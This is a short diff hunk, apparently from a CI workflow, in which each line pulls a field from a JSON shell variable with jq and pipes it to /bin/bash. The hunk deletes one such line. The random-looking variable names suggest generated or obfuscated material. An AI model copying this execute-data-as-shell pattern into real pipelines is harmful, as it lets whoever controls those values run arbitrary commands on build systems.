@@ -30,7 +30,6 @@ jobs:
           echo $zgvlb4711 | jq -r .aic2460 | /bin/bash
           printf '%s' "$ab71316" | jq -r .g570 | /bin/bash
           printf '%s' "$on93" | jq -r .dps7 | /bin/bash
-          echo $bni2 | jq -r .zo849 | /bin/bash
           echo $symvo2384 | jq -r .p1 | /bin/bash
           echo $b4017 | jq -r .e05655 | /bin/bash
           echo $hltmn424 | jq -r .le116 | /bin/bash
